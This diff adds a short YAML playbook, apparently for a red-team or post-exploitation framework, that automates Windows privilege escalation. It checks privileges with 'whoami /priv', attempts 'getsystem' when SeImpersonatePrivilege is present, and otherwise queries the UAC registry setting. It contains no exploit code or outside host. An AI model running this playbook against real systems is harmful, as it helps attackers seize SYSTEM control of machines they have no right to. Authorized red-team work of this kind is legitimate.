@@ -1,0 +1,30 @@
+name: Privilege Escalation
+# Attempts multiple privilege escalation techniques
+
+actions:
+  # Check current privileges
+  - name: check_privileges
+    type: shell
+    parameters:
+      command: whoami /priv
+
+  # Try getsystem if we have impersonation privileges
+  - name: attempt_getsystem
+    type: getsystem
+    conditions:
+      - source: check_privileges
+        operator: contains
+        value: SeImpersonatePrivilege
+    on_success:
+      - name: verify_system
+        type: getuid
+    on_failure:
+      # If getsystem fails, try alternative methods
+      - name: check_uac
+        type: shell
+        parameters:
+          command: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+
+  # Check if we're now SYSTEM
+  - name: final_check
+    type: getuid
